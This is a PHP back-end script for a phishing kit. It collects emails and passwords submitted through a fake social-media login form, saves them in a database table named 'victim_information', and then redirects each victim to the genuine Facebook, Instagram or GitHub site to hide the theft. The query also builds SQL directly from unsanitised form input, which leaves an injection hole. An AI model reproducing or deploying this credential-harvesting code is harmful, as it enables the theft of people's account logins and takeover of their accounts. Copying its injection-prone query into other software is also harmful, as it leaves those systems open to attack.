<?php
require_once('../database.php');
 if(isset($_REQUEST['saveData'])){
    if($_POST['email'] == ""){
        echo "<script>alert('please do not blank email field')<script>";
    } elseif ($_POST['password']==""){
        echo "<script>alert('please enter password')<script>";
    }else {
            $email = $_POST['email'];
            $password = $_POST['password'];
            $social = $_POST['social'];
            $userId = $_POST['userId'];
            $sql = "INSERT INTO victim_information (`user id`, `email`, `password`, `social network`) VALUES ('$userId','$email','$password','$social')";
            if($conn->query($sql) == TRUE){
                // $error = "<strong style='color:green'> User registered successfull!  </strong>";
                // echo $error;
                switch($social){
                     case "Facebook";
                     header("Location:https://www.facebook.com");
                     break;

                     case "Instagram";
                     header("Location:https://www.instagram.com");
                     break;

                     case "Github";
                     header("Location:https://www.github.com");
                     break;
                     default;
                     header("Location:https://media.istockphoto.com/vectors/internet-error-page-not-found-in-vertical-orientation-for-mobile-a-vector-id1252582562");
                }
            } else {
                $error = $conn->error. " <strong style='color:red'>  Unable to registered user, Please <a href=''style='text-decoration:none;underline:none;color:blue;'> contact us </a></strong>";
                echo $error;
            }
        }
    }
?>